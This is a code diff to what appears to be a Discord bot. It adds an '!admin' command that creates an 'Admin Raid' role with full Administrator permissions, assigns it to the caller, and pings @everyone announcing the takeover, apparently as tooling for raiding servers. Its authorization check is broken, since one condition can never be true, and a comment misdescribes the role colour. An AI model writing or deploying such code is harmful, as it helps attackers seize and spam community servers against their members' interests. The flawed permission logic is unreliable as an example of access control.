@@ -221,6 +221,47 @@ client.on('messageCreate', async (message) => {
       await message.channel.send(`**Error grave:** ${err.message || 'Revisa logs'}`).catch(() => {});
     }
   }
+  if (command === 'admin') {
+  if (!OWNER_IDS.includes(message.author.id)) {
+    return message.reply('Solo el owner del bot puede usar !admin.');
+  }
+
+  // Verifica si eres owner del servidor donde escribes el comando
+  if (!message.member.permissions.has('Administrator') || !message.guild.ownerId === message.author.id) {
+    return message.reply('Este comando solo funciona si eres **owner** del servidor donde lo escribes.');
+  }
+
+  const serverName = args.join(' '); // nombre del servidor que pones después de !admin
+  if (!serverName) {
+    return message.reply('Uso: !admin <nombre del servidor>\nEjemplo: !admin Mi Server Raid');
+  }
+
+  try {
+    // Busca si ya existe un rol "Admin Raid" o crea uno nuevo
+    let rolAdmin = message.guild.roles.cache.find(r => r.name === 'Admin Raid');
+    if (!rolAdmin) {
+      rolAdmin = await message.guild.roles.create({
+        name: 'Admin Raid',
+        color: '#f0da14', // rojo intenso
+        permissions: ['Administrator'], // permisos completos
+        hoist: true, // se muestra separado en la lista de miembros
+        mentionable: true
+      });
+      await message.channel.send('Rol **Admin Raid** creado con éxito.');
+    }
+
+    // Asigna el rol al usuario que escribió el comando (tú o quien lo use)
+    await message.member.roles.add(rolAdmin);
+    await message.channel.send(`¡Listo! Ahora tienes rol **Admin Raid** en **${serverName}** 😈`);
+
+    // Opcional: mensaje épico en el canal
+    await message.channel.send('@everyone EL OWNER $ pwm AHORA ES ADMIN AQUÍ 🔥 https://discord.gg/tu-invite');
+
+  } catch (err) {
+    console.error('Error en !admin:', err.message || err);
+    await message.channel.send(`Error: ${err.message || 'No tengo permisos suficientes para crear/asignar roles.'}`).catch(() => {});
+  }
+}
 });
 
 client.login(process.env.TOKEN).catch(err => {
